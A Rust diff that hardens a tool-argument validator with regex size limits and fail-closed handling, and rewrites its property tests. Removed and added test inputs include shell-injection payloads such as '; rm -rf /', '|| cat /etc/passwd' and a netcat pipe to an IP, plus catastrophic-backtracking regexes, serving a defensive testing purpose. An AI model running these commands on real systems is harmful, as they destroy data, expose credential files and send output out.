@@ -221,15 +221,20 @@ where
 }
 
 pub(crate) fn matches_pattern(val: &str, pattern: &str) -> bool {
-    if val.is_empty() {
+    if val.is_empty() || pattern.is_empty() {
         return false;
     }
 
-    if let Ok(re) = regex::Regex::new(pattern) {
+    if let Ok(re) = regex::RegexBuilder::new(pattern)
+        .size_limit(1 << 20)
+        .dfa_size_limit(1 << 20)
+        .build()
+    {
         return re.is_match(val);
     }
 
-    // Strict fallback: letters, numbers, underscore, colon, hyphen
+    // Reject invalid or oversized regex patterns fail-closed for non-trivial values;
+    // allow only simple identifier tokens under malformed regex fallback.
     val.chars()
         .all(|c| c.is_ascii_alphanumeric() || c == '_' || c == ':' || c == '-')
 }
@@ -821,18 +826,7 @@ mod tests {
         proptest! {
             #[test]
             fn prop_shell_injection_payloads_rejected_by_regex(
-                prefix in "[a-zA-Z0-9_-]{1,10}",
-                meta in prop_oneof![
-                    Just("; rm -rf /"),
-                    Just("&& id"),
-                    Just("|| cat /etc/passwd"),
-                    Just("$(whoami)"),
-                    Just("`uname`"),
-                    Just("| nc 1.2.3.4 4444"),
-                    Just("\necho pwn"),
-                    Just(" > /tmp/x"),
-                ],
-                suffix in "[a-zA-Z0-9_]{0,6}",
+                payload in "\\PC*",
             ) {
                 let ws = Path::new(".");
                 let tool = ToolDefinition {
@@ -847,19 +841,19 @@ mod tests {
                     ..Default::default()
                 };
 
-                let clean = json!({ "target": prefix });
-                prop_assert!(validate_and_build_args(&tool, ws, &clean).is_ok());
-
-                let injected = format!("{prefix}{meta}{suffix}");
-                let bad = json!({ "target": injected });
-                prop_assert!(validate_and_build_args(&tool, ws, &bad).is_err());
+                let args = json!({ "target": payload });
+                let res = validate_and_build_args(&tool, ws, &args);
+                let strictly_safe = !payload.is_empty()
+                    && payload
+                        .bytes()
+                        .all(|b| b.is_ascii_alphanumeric() || b == b'_' || b == b'-');
+                prop_assert_eq!(res.is_ok(), strictly_safe);
             }
 
             #[test]
             fn prop_mutually_exclusive_and_enum_validation_enforced(
-                a_val in "[a-z]{2,8}",
-                b_val in "[a-z]{2,8}",
-                bad_mode in "[a-z]{4,10}",
+                b_val in any::<String>(),
+                bad_mode in any::<String>(),
             ) {
                 let ws = Path::new(".");
                 let tool = ToolDefinition {
@@ -881,13 +875,66 @@ mod tests {
                 };
 
                 let conflict = json!({ "mode": "fast", "override_flag": b_val });
-                prop_assert!(validate_and_build_args(&tool, ws, &conflict).is_err());
+                if b_val.trim().is_empty() {
+                    // Empty/whitespace strings are normalized to unset optional values.
+                    prop_assert!(validate_and_build_args(&tool, ws, &conflict).is_ok());
+                } else {
+                    prop_assert!(validate_and_build_args(&tool, ws, &conflict).is_err());
+                }
 
-                if bad_mode != "fast" && bad_mode != "safe" {
+                let trimmed_mode = bad_mode.trim();
+                if !trimmed_mode.is_empty() && trimmed_mode != "fast" && trimmed_mode != "safe" {
                     let invalid_enum = json!({ "mode": bad_mode });
                     prop_assert!(validate_and_build_args(&tool, ws, &invalid_enum).is_err());
                 }
-                let _ = a_val;
+            }
+
+            #[test]
+            fn prop_semantically_hostile_toml_args_and_pathological_regexes(
+                payload_len in 64usize..512,
+                hostile_regex in prop_oneof![
+                    Just(String::new()),
+                    Just("^(a+)+$".to_owned()),
+                    Just("^a{100}{100}$".to_owned()),
+                    Just("^((((a|b)+)+)+)+$".to_owned()),
+                    Just("[unclosed_regex".to_owned()),
+                ],
+                timeout_val in prop_oneof![Just(0u64), Just(u64::MAX), Just(30u64)],
+            ) {
+                let escaped_regex = serde_json::to_string(&hostile_regex).expect("escape regex");
+                let toml_text = format!(
+                    "[tools.adversarial]\n\
+                     description = \"hostile\"\n\
+                     action = \"parameterized_command\"\n\
+                     command = [\"echo\"]\n\
+                     timeout_seconds = {timeout_val}\n\
+                     [[tools.adversarial.args]]\n\
+                     name = \"target\"\n\
+                     required = true\n\
+                     regex = {escaped_regex}\n"
+                );
+                let raw = tkg_common::tools::RawToolsConfig::parse(&toml_text)
+                    .expect("valid hostile TOML must parse");
+                let resolved = tkg_common::tools::resolve(&raw);
+                let tool = resolved
+                    .into_iter()
+                    .find(|t| t.name == "adversarial")
+                    .expect("adversarial tool resolved");
+
+                // Empty regex MUST fail closed; ReDoS/oversized regexes must reject `; rm -rf /`
+                // and complete rapidly on long adversarial strings without hanging.
+                let long_bad = format!("{}!; rm -rf /", "a".repeat(payload_len));
+                let bad_args = json!({ "target": long_bad });
+                let res = validate_and_build_args(&tool, Path::new("."), &bad_args);
+                prop_assert!(
+                    res.is_err(),
+                    "hostile payload unexpectedly accepted for regex {:?}",
+                    hostile_regex
+                );
+                prop_assert!(!matches_pattern("; rm -rf /", &hostile_regex));
+                if hostile_regex.is_empty() {
+                    prop_assert!(!matches_pattern("clean_token", ""));
+                }
             }
         }
     }
